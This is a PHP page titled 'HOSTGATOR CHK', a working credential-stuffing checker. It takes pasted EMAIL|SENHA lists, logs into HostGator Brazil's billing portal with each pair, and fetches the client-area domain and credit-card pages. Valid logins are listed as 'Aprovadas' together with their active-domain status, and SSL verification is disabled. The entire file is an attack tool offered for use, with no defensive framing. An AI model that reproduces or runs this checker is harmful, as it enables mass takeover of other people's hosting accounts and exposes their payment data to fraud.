<?php


session_start();
error_reporting(0);
if(!isset($_SESSION['usuario']) and !isset($_SESSION['senha'])){
	echo "<script>location.href='/'</script>";
  die();
}


?>

<!DOCTYPE html />

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<head><title>HostGator</title>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
<center>
<br>
<center><font size="8" face="hacked" color="white">HOSTGATOR CHK</font></center><br>
<form method="post">
    <textarea class="text-muted" name="list" cols="100" rows="10" placeholder="Formato: EMAIL|SENHA" ></textarea><br><br>
    <input class="btn btn-success" type="submit" value="Testar" name="x" />
    <br>
</form>
<style>

    body{
        background: url(http://paperlief.com/images/universe-solar-system-wallpaper-4.jpg);
        color: white;
        background-attachment: fixed;
        background-size: cover;
    }
</style>
<input size="115" class="btn btn-success" value="Aprovadas" />
<div><textarea class="text-muted" id="accs_live" cols="115" rows="4" ></textarea><br><br></div>
<input size="115" class="btn btn-danger" value="Reprovadas" />
<div><textarea class="text-muted" id="accs_die" cols="115" rows="4" ></textarea><br><br></div>
</div>
</center>
<?php
set_time_limit(0);
error_reporting(0);

class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
        //echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
if (isset($_POST['x'])) {

    $list = explode("\r\n", $_POST['list']);
    flush();
    foreach ($list as $value) {
        ob_implicit_flush(true);
        list($email , $senha ) = explode("|", $value);
        $email = trim($email);
        $senha = trim($senha);

$a = new cURL();
    $b = $a->get("https://financeiro.hostgator.com.br");//CHAMADA TOKEN
    $token = getStr($b,'name="token" value="','"'); //CHAMADA TOKEN
    
    
    $c = new cURL();
    $d = $c->post('https://financeiro.hostgator.com.br/dologin.php','token='.$token.'&username='.$email.'&password='.$senha.''); //POST DA 2 CHAMADA
    
    $e = new cURL();
    $f = $e->get("https://financeiro.hostgator.com.br/clientarea.php?action=domains");
    $g = $e->get("https://financeiro.hostgator.com.br/clientarea.php?action=creditcard");
    
    if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }

    if (strpos($d, 'Sair')) { 
   $dominio = getStr($f, '<a href="http://','" target="_blank">');
   $status = getStr($f, '<i class="fa fa-circle ico-status-','"></i>');
   if (strpos($f, 'active')) {
       $sim = "SIM";
   }else{
    $nao = "NÃO";
   }

            echo '<script>$("#accs_live").prepend("Aprovada ➜ '.$value.' | Dominio ativo: '.$sim.''.$nao.' #Demitri-Checkers<br>\n ");</script>';

//                                      | Nome: '.$nome.' | '.$nome.'

        }else{

            echo '<script>$("#accs_die").prepend("Reprovada ➜ '.$value.' <br>\n ");</script>';
        }
   flush(); ob_flush();
    }
}

?>